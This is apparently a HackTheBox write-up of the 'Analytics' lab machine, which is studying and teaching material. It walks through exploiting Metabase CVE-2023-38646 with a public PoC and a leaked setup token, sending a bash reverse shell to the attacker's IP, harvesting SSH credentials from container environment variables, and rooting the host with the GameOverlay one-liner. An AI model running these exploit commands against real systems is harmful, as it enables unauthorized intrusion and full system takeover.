---
title: Analytics
date: 2023-12-06
categories: [CTF, HackTheBox]
tags: [easy, linux, subdomain, cve, docker, env, gameoverlay]
img_path: /assets/img/htb/Analytics
image: 
    path: analytics.webp
    lqip: data:image/webp;base64,L2Fzc2V0cy9pbWcvaHRiL0FuYWx5dGljcy9hbmFseXRpY3Mud2VicA==
    alt: Machine Info Card
---

## Machine Info

Analytics is an easy difficulty Linux machine with exposed HTTP and SSH services. Enumeration of the website reveals a `Metabase` instance, which is vulnerable to Pre-Authentication Remote Code Execution ([CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646){:target="_blank"}), which is leveraged to gain a foothold inside a Docker container. Enumerating the Docker container we see that the environment variables set contain credentials that can be used to SSH into the host. Post-exploitation enumeration reveals that the kernel version that is running on the host is vulnerable to `GameOverlay`, which is leveraged to obtain root privileges.

## Port Scanning

We are going to begin by using `nmap` to scan for open ports.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.248.190 -oN allports
```

![Nmap Results: Open Ports](allports.png)
_Open Ports_

## Service Detection

There are 2 open ports in the target, so let's use `nmap` one more time to get more information about them.

```bash
nmap -p22,80 -sCV 10.129.248.190 -oN services
```

![Nmap Results: Services](services.png)
_Services & Versions_

## Port 80 Enumeration

Since we found a domain in the `nmap` results, we have to add it to our `/etc/hosts`{: .filepath} file:

![Add domain](hosts1.png)

Looking at the website, it seems to be a static page but the login tab redirects us to a subdomain: **data.analytical.htb**

![Website](web.png)

![Subdomain](subdomain.png)

To access that site we have to add the subdoaim to our `/etc/hosts`{: .filepath} file:

![Add Subdomain](hosts2.png)

We found the login page of a service called [Metabase](https://www.metabase.com/){:target="_blank"}. Since we don't have valid credentials we are going to search in order to find any vulnerability associated with this service.

![Metabase Login Panel](loginpanel.png)
_Metabase Login Panel_

>Metabase is an open source business intelligence tool that lets you create charts and dashboards using data from a variety of databases and data sources.
{: .prompt-info }

### Metabase Pre-Auth RCE | CVE-2023-38646

A simple search shows us that there is a vulnerability in **Metabase** that allows to gain **Remote Command Execution**.

![Searching for Metabase Vulnerabilities](searchmeta.png)

[CVE-2023–38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646){:target="_blank"}, allowed attackers to execute arbitrary commands on the server without requiring any authentication. The impact of this flaw was severe, as it granted unauthorized access to the server at the server’s privilege level.

>The vulnerability existed in the /api/setup/validate API endpoint, which served as a crucial part of Metabase’s initial setup process. During application setup, this endpoint was responsible for checking the database connection. However, attackers could exploit a flaw in the JDBC connection handling, leading to remote code execution (RCE) with pre-authentication. This meant that attackers could execute malicious commands on the server with elevated privileges, gaining full control over the application environment. With this level of access, an attacker could potentially steal sensitive data, manipulate the application, or even gain control of the entire server infrastructure.
{: .prompt-danger }

To successfully exploit this service we are going to use this [Github Repository](https://github.com/m3m0o/metabase-pre-auth-rce-poc){:target="_blank"}. The vulnerability consists in the use of a setup token which then will allow us to execute commands on the server.

```bash
wget https://raw.githubusercontent.com/m3m0o/metabase-pre-auth-rce-poc/main/main.py
```

![Downloading Exploit](exploit.png)

First we have to check if we have the **setup-token** available, so we have to try the endpoint `/api/session/properties`{: .filepath} and it will give us a lot of information. We are going to use the terminal to easily get what we want.

```bash
curl -s -X GET http://data.analytical.htb/api/session/properties | jq | grep 'setup-token' -C 2
```

![Token](token.png)

We have everything needed to test the exploit, so we will need the **target url**, the **setup-token** we just found and the **command we want to run**. This vulnerability is special because we can not see the output of the command, so we are going to send a ping request to our server in order to check if we have remote command execution.

>Remember to use `tcpdump` to listen for **icmp** requests.
{: .prompt-tip }

```bash
python3 metabase_exploit.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c 'ping -c1 10.10.14.206'
```

![Testing Exploit](testing.png)
_Testing the exploit_

We get the icmp packets so now we are going to use the bash one-liner in order to get a reverse shell:

```bash
python3 metabase_exploit.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c 'bash -i >& /dev/tcp/10.10.14.206/443 0>&1'
```

![RevShell](revshell.png)
_Sending a Reverse Shell_

## Shell as metalytics

We gained access to a Docker container, but using the `env` command we found credentials for `ssh`.

![Credentials](creds.png)

We saved the credential and use it to connect via `ssh` and finally we get access to the real machine as the **metalytics** user.

![SSH Login](ssh.png)

![Hostname](hostname.png)

## Privilege Escalation | [CVE-2023-2640](https://cloudsecurityalliance.org/blog/2023/10/17/new-container-exploit-rooting-non-root-containers-with-cve-2023-2640-and-cve-2023-32629-aka-gameover-lay){:target="_blank"}

After somer enumeration, we can notice the version of Ubuntu this machine is running and we found a vulnerability on the internet that allows us to elevate our privileges to root just by using a specific crafted command.

![System Info](uname.png)

![Privilege Escalation Search](searchpriv.png)

In this [Reddit Discussion](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/){:target="_blank"} there is a **Proof of Concept** we can use to test this machine. Just run the following command and as shown in the image below we managed to get a shell as root.

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
```

![Privilege Escalation](privesc.png)
_Getting a Shell as Root_

## Flags

- [x] user.txt

```bash
cat /home/metalytics/user.txt 
e99**************************92f
```

- [x] root.txt

```bash
cat /root/root.txt
f49**************************88f
```

Thanks for reading! 🙌 🙌 🙌

